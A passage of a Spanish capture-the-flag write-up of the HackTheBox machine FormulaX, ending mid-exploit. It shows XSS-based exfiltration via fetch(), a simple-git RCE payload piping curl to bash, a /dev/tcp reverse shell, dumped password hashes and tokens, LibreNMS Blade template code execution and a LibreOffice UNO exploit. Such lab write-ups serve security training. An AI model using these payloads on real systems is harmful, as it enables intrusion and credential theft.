+<p>Modificamos la linea <code>fetch(&quot;http://10.10.14.71:8081/?q=&quot; + msg)</code> por <code>fetch(&quot;http://10.10.14.71:8081/?q=&quot; + btoa(msg))</code></p>
+<p>Y la linea <code>socket.emit('client_message', 'help')</code> por <code>socket.emit('client_message', 'history')</code> ya que lo que queremos es ver el historial del usuario.</p>
+<p>Y recibimos la siguiente data</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#ae81ff">8081</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8081</span> <span style="color:#f92672">(</span>http://0.0.0.0:8081/<span style="color:#f92672">)</span> ...
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 19:22:40<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /evil.js HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 19:22:40<span style="color:#f92672">]</span> code 501, message Unsupported method <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;OPTIONS&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 19:22:40<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;OPTIONS /injected HTTP/1.1&#34;</span> <span style="color:#ae81ff">501</span> -
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 19:22:40<span style="color:#f92672">]</span> code 501, message Unsupported method <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;OPTIONS&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 19:22:40<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;OPTIONS /loadedd HTTP/1.1&#34;</span> <span style="color:#ae81ff">501</span> -
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 19:22:40<span style="color:#f92672">]</span> code 501, message Unsupported method <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;OPTIONS&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 19:22:40<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;OPTIONS /?d=SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg== HTTP/1.1&#34;</span> <span style="color:#ae81ff">501</span> -
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 19:22:40<span style="color:#f92672">]</span> code 501, message Unsupported method <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;OPTIONS&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 19:22:40<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;OPTIONS /?d=R3JlZXRpbmdzIS4gSG93IGNhbiBpIGhlbHAgeW91IHRvZGF5ID8uIFlvdSBjYW4gdHlwZSBoZWxwIHRvIHNlZSBzb21lIGJ1aWxkaW4gY29tbWFuZHM= HTTP/1.1&#34;</span> <span style="color:#ae81ff">501</span> -
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 19:22:40<span style="color:#f92672">]</span> code 501, message Unsupported method <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;OPTIONS&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 19:22:40<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk= HTTP/1.1&#34;</span> <span style="color:#ae81ff">501</span> -
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 19:22:40<span style="color:#f92672">]</span> code 501, message Unsupported method <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;OPTIONS&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 19:22:40<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgdG8gYXV0b21hdGUgdGhlIGF1dG8tdXBkYXRl HTTP/1.1&#34;</span> <span style="color:#ae81ff">501</span> -
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 19:22:40<span style="color:#f92672">]</span> code 501, message Unsupported method <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;OPTIONS&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>10.129.230.190 - - <span style="color:#f92672">[</span>31/Jul/2024 19:22:40<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;OPTIONS /?d=TWVzc2FnZSBTZW50Ojxicj5oaXN0b3J5 HTTP/1.1&#34;</span> <span style="color:#ae81ff">501</span> -
+</span></span></code></pre></div><p>Decodificando las cadenas podemos ver que hemos descubierto un subdominio.
+<code>dev-git-auto-update.chatbot.htb</code>
+<img src="images/Screenshot_8.png" alt="Write-up Image"></p>
+<h1 id="foothold">Foothold</h1>
+<p>Descubrimos otro servicio extra.
+<img src="images/Screenshot_9.png" alt="Write-up Image"></p>
+<p>Con un vistazo rápido a la página detectamos que se está usando <code>simple-git v3.14</code>
+<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
+<p>Y una simple búsqueda en Google nos reporta que tiene una vulnerabilidad de tipo RCE. Lo podemos leer <a href="https://github.com/gitpython-developers/GitPython/issues/1515">aquí</a></p>
+<p><img src="images/Screenshot_11.png" alt="Write-up Image"></p>
+<p>¡Y tenemos RCE!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo tcpdump icmp -i tun0
+</span></span><span style="display:flex;"><span>tcpdump: verbose output suppressed, use -v<span style="color:#f92672">[</span>v<span style="color:#f92672">]</span>... <span style="color:#66d9ef">for</span> full protocol decode
+</span></span><span style="display:flex;"><span>listening on tun0, link-type RAW <span style="color:#f92672">(</span>Raw IP<span style="color:#f92672">)</span>, snapshot length <span style="color:#ae81ff">262144</span> bytes
+</span></span><span style="display:flex;"><span>19:30:29.164331 IP dev-git-auto-update.chatbot.htb &gt; 10.10.14.71: ICMP echo request, id 1, seq 1, length <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>19:30:29.164390 IP 10.10.14.71 &gt; dev-git-auto-update.chatbot.htb: ICMP echo reply, id 1, seq 1, length <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>19:30:30.165628 IP dev-git-auto-update.chatbot.htb &gt; 10.10.14.71: ICMP echo request, id 1, seq 2, length <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>19:30:30.165657 IP 10.10.14.71 &gt; dev-git-auto-update.chatbot.htb: ICMP echo reply, id 1, seq 2, length <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>19:30:31.167686 IP dev-git-auto-update.chatbot.htb &gt; 10.10.14.71: ICMP echo request, id 1, seq 3, length <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>19:30:31.167716 IP 10.10.14.71 &gt; dev-git-auto-update.chatbot.htb: ICMP echo reply, id 1, seq 3, length <span style="color:#ae81ff">64</span>
+</span></span></code></pre></div><p>Nos creamos un <code>rev.sh</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.71/443 0&gt;&amp;1&#34;</span>
+</span></span></code></pre></div><p>Nos ponemos en escucha con <code>netcat</code> y usamos este payload <code>ext::sh -c curl% http://10.10.14.71:8081/rev.sh|bash</code></p>
+<h1 id="user-pivoting-1">User Pivoting 1</h1>
+<p>Enumerando la máquina víctima nos encontramos que hay una instancia de mongodb.
+<code>tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -</code></p>
+<p>Lo podemos ver mediante el comando <code>netstat -tulnp</code> o revisando el archivo <code>.env</code> de la aplicación.</p>
+<pre tabindex="0"><code class="language-venv" data-lang="venv">www-data@formulax:~/app$ cat .env
+cat .env
+PORT = 8082
+URL_DATABASE=&#34;mongodb://localhost:27017&#34;
+SECRET=ThisIsTheN0deSecret
+ADMIN_EMAIL=&#34;admin@chatbot.htb&#34;
+</code></pre><p>con <code>mongo --shell</code> podemos hacer peticiones mediante el CLI.</p>
+<p>Enumerando las Bases de Datos vemos las siguientes</p>
+<pre tabindex="0"><code class="language-mongo" data-lang="mongo">show dbs
+admin    0.000GB
+config   0.000GB
+local    0.000GB
+testing  0.000GB
+</code></pre><p>Enumerando las &ldquo;tablas&rdquo; (colecciones en mongo), la única que me llaman la atención es <code>messages</code> y <code>users</code></p>
+<pre tabindex="0"><code class="language-mongo" data-lang="mongo">use admin
+switched to db admin
+show collections
+system.version
+use config
+switched to db config
+show collections
+system.sessions
+use local
+switched to db local
+show collections
+startup_log
+use testing
+switched to db testing
+show collections
+messages
+users
+</code></pre><p>La colección de mensajes está vacía pero la de usuarios no.</p>
+<pre tabindex="0"><code class="language-mongo" data-lang="mongo">db.messages.find()
+
+db.users.find()
+{ &#34;_id&#34; : ObjectId(&#34;648874de313b8717284f457c&#34;), &#34;name&#34; : &#34;admin&#34;, &#34;email&#34; : &#34;admin@chatbot.htb&#34;, &#34;password&#34; : &#34;$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.&#34;, &#34;terms&#34; : true, &#34;value&#34; : true, &#34;authorization_token&#34; : &#34;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MjI0NDA0MDh9.q_R-YzbX7fuJigMJuVCeuIIlr3WhWPQSwHd5HkU9BYs&#34;, &#34;__v&#34; : 0 }
+{ &#34;_id&#34; : ObjectId(&#34;648874de313b8717284f457d&#34;), &#34;name&#34; : &#34;frank_dorky&#34;, &#34;email&#34; : &#34;frank_dorky@chatbot.htb&#34;, &#34;password&#34; : &#34;$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6&#34;, &#34;terms&#34; : true, &#34;value&#34; : true, &#34;authorization_token&#34; : &#34; &#34;, &#34;__v&#34; : 0 }
+{ &#34;_id&#34; : ObjectId(&#34;66aa51b7af10999e6470d490&#34;), &#34;name&#34; : &#34;pointed&#34;, &#34;email&#34; : &#34;pointed@pointed.com&#34;, &#34;password&#34; : &#34;$2b$10$zhNJTJtpGe3/6QILJisd6uednRpMdaTopmes6TCgFL1KFkGQdjdpq&#34;, &#34;terms&#34; : true, &#34;value&#34; : false, &#34;authorization_token&#34; : &#34;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NmFhNTFiN2FmMTA5OTllNjQ3MGQ0OTAiLCJpYXQiOjE3MjI0Mzg1NzZ9.EpNX-g0c9erS1XM7BDde8nLVhkDkzhpkoeTBV8fRKug&#34;, &#34;__v&#34; : 0 }
+</code></pre><p>Y tenemos hashes que podemos intentar crackear.</p>
+<p>Revisando el example-hashes de hashcat. Puede ser un hash <code>bcrypt(sha256($pass)) / bcryptsha256 *</code>
+<img src="images/Screenshot_12.png" alt="Write-up Image"></p>
+<p>Pero no se encuentra el módulo en hashcat.
+<img src="images/Screenshot_14.png" alt="Write-up Image"></p>
+<p>Por lo cual antes de descargar nada, probé el otro módulo que podía ser..
+<code>bcrypt $2*$, Blowfish (Unix)</code>
+<img src="images/Screenshot_13.png" alt="Write-up Image">
+Consigo crackear el hash correspondiente al usuario <code>frank_dorky</code> , el del usuario administrador no.
+<img src="images/Screenshot_15.png" alt="Write-up Image"></p>
+<p>Y esta es la password de <code>frank_dorky</code> para acceder por SSH</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ssh frank_dorky@10.129.230.190
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;10.129.230.190 (10.129.230.190)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:e0esz1Aos6gxct2ci4LGbCAR6i31EoktxFIvCFF+rcM.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This key is not known by any other names.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.129.230.190<span style="color:#e6db74">&#39; (ED25519) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">frank_dorky@10.129.230.190&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 22.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 5.15.0-97-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/pro
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>This system has been minimized by removing packages and content that are
+</span></span><span style="display:flex;"><span>not required on a system that users <span style="color:#66d9ef">do</span> not log into.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>To restore this content, you can run the <span style="color:#e6db74">&#39;unminimize&#39;</span> command.
+</span></span><span style="display:flex;"><span>Last login: Mon Jul <span style="color:#ae81ff">15</span> 13:46:54 <span style="color:#ae81ff">2024</span> from 10.10.14.41
+</span></span><span style="display:flex;"><span>frank_dorky@formulax:~$
+</span></span></code></pre></div><p>Con este usuario podemos leer la flag <code>user.txt</code></p>
+<h1 id="user-pivoting-2">User Pivoting 2</h1>
+<p>Pasando el <code>linpeas.sh</code> me he dado cuenta de otro puerto interesante que se me había pasado.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>╔══════════╣ Active Ports
+</span></span><span style="display:flex;"><span>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8082          0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8081          0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:42931         0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:27017         0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:3000          0.0.0.0:*               LISTEN      - 
+</span></span></code></pre></div><p>En la máquina están abiertos varios puertos que no he revisado.
+Sabemos que el puerto <code>8082</code> corresponde a la aplicación principal, pero no se nada sobre los puertos <code>8081</code>, <code>8000</code> y <code>3000</code></p>
+<p>En el puerto <code>8000</code> vemos lo siguiente y después de enumerar un rato no encuentro nada interesante así que supuse que era un rabbit hole.
+<img src="images/Screenshot_16.png" alt="Write-up Image"></p>
+<p>Y en el puerto <code>8081</code> nos damos cuenta de que es el servicio que hemos explotado anteriormente.
+<img src="images/Screenshot_17.png" alt="Write-up Image"></p>
+<p>Así que ahora hacemos el port forwarding al puerto <code>3000</code>
+<code>$ sshpass -p 'manchesterunited' ssh -L 3000:127.0.0.1:3000 frank_dorky@10.129.230.190</code></p>
+<p>Y vemos un CMS llamado <code>LibreNMS</code> y las credenciales encontradas para el usuario <code>frank_dorky</code> son válidas.
+<img src="images/Screenshot_18.png" alt="Write-up Image"></p>
+<p>Encontramos varias vulnerabilidades para LibreNMS.
+La que mas me llamó la atención fue <a href="https://www.shielder.com/advisories/librenms-about-authenticated-command-injection/">esta</a> pero es para una versión mas antigua.</p>
+<p>Inspeccionando otros exploits me di cuenta de una ruta en especifico.
+<img src="images/Screenshot_19.png" alt="Write-up Image"></p>
+<p>A la cual no tenía permisos para acceder, así que supuse que <code>frank_dorky</code> es un usuario de bajos privilegios en este panel.
+<img src="images/Screenshot_20.png" alt="Write-up Image"></p>
+<p>Investigando un poco sobre como podría añadir un usuario administrador, me encontré con este <a href="https://community.librenms.org/t/adding-admin-users-on-librenms/20782">post</a></p>
+<p>Ahora solo necesito saber donde está el archivo <code>adduser.php</code></p>
+<p>Un poco oculto pero encontré el archivo..</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>rank_dorky@formulax:/opt/librenms$ ls
+</span></span><span style="display:flex;"><span>ls: cannot open directory <span style="color:#e6db74">&#39;.&#39;</span>: Permission denied
+</span></span><span style="display:flex;"><span>frank_dorky@formulax:/opt/librenms$ ls -l adduser.php
+</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> librenms librenms <span style="color:#ae81ff">956</span> Oct <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2022</span> adduser.php
+</span></span></code></pre></div><p>Por lo cual añadí al usuario</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ky@formulax:/opt/librenms$ ./adduser.php pointed pointed <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>User pointed added successfully
+</span></span></code></pre></div><p>Y ahora sí que pude acceder a las funciones restringidas para administradores del CMS.
+<img src="images/Screenshot_21.png" alt="Write-up Image"></p>
+<p>Tras buscar mas y mas, encontré este otro <a href="https://www.sonarsource.com/blog/it-s-a-snmp-trap-gaining-code-execution-on-librenms/">post</a></p>
+<p>Donde se habla de un XSS que podría elevarse a un RCE, a mí solo me importa la parte del RCE.</p>
+<pre tabindex="0"><code>The impact of this vulnerability is greatly increased due to a feature called Alert Templates. This feature allows administrators to create custom templates that will be populated with specific values when an alert occurs.
+
+
+The template engine used for this feature is Blade. The user-provided custom templates are rendered inline by using the Blade::render method:
+
+
+librenms/includes/html/forms/alert-templates.inc.php
+
+&lt;?php
+Blade::render($vars[&#39;template&#39;]);
+
+Attackers with the ability to control the value passed to this method can directly gain code execution. This is due to the fact that Blade templates allow executing arbitrary PHP code via the @php directive:
+
+
+@php
+  system(&#34;id&gt;/tmp/pwned&#34;);
+@endphp
+</code></pre><p>Por lo cual nos dirigimos a <code>Alert Templates</code>
+<img src="images/Screenshot_22.png" alt="Write-up Image"></p>
+<p>Creamos una plantilla maliciosa..
+<img src="images/Screenshot_23.png" alt="Write-up Image"></p>
+<p>Al intentar agregar la plantilla se quedaba colgado, así que revisando la consola del navegador, descubro un subdominio que debo de agregar al <code>/etc/hosts</code>
+<img src="images/Screenshot_24.png" alt="Write-up Image"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat /etc/hosts
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Host addresses</span>
+</span></span><span style="display:flex;"><span>127.0.0.1  localhost librenms.com
+</span></span></code></pre></div><p>Ahora, accediendo con el dominio correcto, sí me deja crear la plantilla maliciosa.
+<img src="images/Screenshot_25.png" alt="Write-up Image"></p>
+<p>Y ganamos acceso como <code>librenms</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.71<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.230.190<span style="color:#f92672">]</span> <span style="color:#ae81ff">57972</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>970<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>librenms@formulax:~$ 
+</span></span></code></pre></div><p>Revisando las variables de entorno de la aplicación vemos lo siguiente</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>DB_USERNAME<span style="color:#f92672">=</span>kai_relay
+</span></span><span style="display:flex;"><span>DB_PASSWORD<span style="color:#f92672">=</span>mychemic...
+</span></span></code></pre></div><p>Esta credencial es la del usuario <code>kai_relay</code></p>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kai_relay@formulax:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> kai_relay on forumlax:
+</span></span><span style="display:flex;"><span>    env_reset, timestamp_timeout<span style="color:#f92672">=</span>0, mail_badpass,
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin,
+</span></span><span style="display:flex;"><span>    use_pty, env_reset, timestamp_timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User kai_relay may run the following commands on forumlax:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/office.sh
+</span></span></code></pre></div><p>Podemos ejecutar como cualquier usuario, root incluido, el script <code>/usr/bin/office.sh</code></p>
+<p>Analizando este script</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kai_relay@formulax:~$ cat /usr/bin/office.sh
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>/usr/bin/soffice --calc --accept<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;socket,host=localhost,port=2002;urp;&#34;</span> --norestore --nologo --nodefault --headless
+</span></span></code></pre></div><ul>
+<li>
+<p><code>--calc</code>: Esta opción abre la aplicación de hojas de cálculo (Calc) de LibreOffice o OpenOffice.</p>
+</li>
+<li>
+<p><code>--accept=&quot;socket,host=localhost,port=2002;urp;&quot;</code>: Esta opción permite que LibreOffice acepte conexiones desde un cliente a través de un socket. En este caso, el socket está configurado para escuchar en el host <code>localhost</code> y el puerto <code>2002</code>. <code>urp</code> se refiere al protocolo Universal Remote Protocol de LibreOffice, que permite la comunicación entre clientes y la instancia de LibreOffice.</p>
+</li>
+<li>
+<p><code>--norestore</code>: Deshabilita la restauración de documentos que estaban abiertos antes de un cierre inesperado o un fallo.</p>
+</li>
+<li>
+<p><code>--nologo</code>: Desactiva la pantalla de inicio (logo) de LibreOffice.</p>
+</li>
+<li>
+<p><code>--nodefault</code>: Evita que se abra cualquier documento predeterminado.</p>
+</li>
+<li>
+<p><code>--headless</code>: Ejecuta LibreOffice en modo sin cabeza, es decir, sin interfaz gráfica de usuario. Esto es útil para operaciones automáticas o en servidores donde no hay un entorno gráfico disponible.</p>
+</li>
+</ul>
+<p>Este script inicia LibreOffice Calc en modo sin cabeza, aceptando conexiones de clientes a través de un socket en <code>localhost</code> en el puerto <code>2002</code>, y desactiva diversas funcionalidades como la restauración de documentos, la pantalla de inicio y la apertura de documentos por defecto.</p>
+<p>Este script tampoco nos sirve de mucho pero si hacemos una búsqueda en Google&hellip; <img src="images/Screenshot_26.png" alt="Write-up Image"></p>
+<p>Nos descargamos el exploit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> searchsploit -m multiple/remote/46544.py
+</span></span><span style="display:flex;"><span>  Exploit: Apache UNO / LibreOffice Version: 6.1.2 / OpenOffice 4.1.6 API - Remote Code Execution
+</span></span><span style="display:flex;"><span>      URL: https://www.exploit-db.com/exploits/46544
+</span></span><span style="display:flex;"><span>     Path: /opt/exploitdb/exploits/multiple/remote/46544.py
+</span></span><span style="display:flex;"><span>    Codes: N/A
+</span></span><span style="display:flex;"><span> Verified: False
+</span></span><span style="display:flex;"><span>File Type: Python script, ASCII text executable
+</span></span><span style="display:flex;"><span>Copied to: /home/pointedsec/Desktop/formulax/exploits/46544.py
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/formulax/exploits<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ mv 46544.py rce.py
+</span></span></code></pre></div><p>Modificamos el exploit para asignar el permiso de SUID al binario<code>/bin/bash</code>.
+<img src="images/Screenshot_27.png" alt="Write-up Image"></p>
+<p>Ahora nos pasamos el exploit a la máquina víctima.</p>
+<p>Ejecutamos el script como sudo para establecer la conexión y poder conectarnos al socket para realizar la explotación.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kai_relay@formulax:/tmp$ sudo /usr/bin/office.sh
+</span></span></code></pre></div><p>Y ahora como cualquier usuario (ya tenía abierta una terminal como <code>frank_dorky</code>, no hace falta ejecutar el exploit como <code>kai_relay</code>)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>rank_dorky@formulax:/tmp$ python3 rce.py --host 127.0.0.1 --port <span style="color:#ae81ff">2002</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Connecting to target...
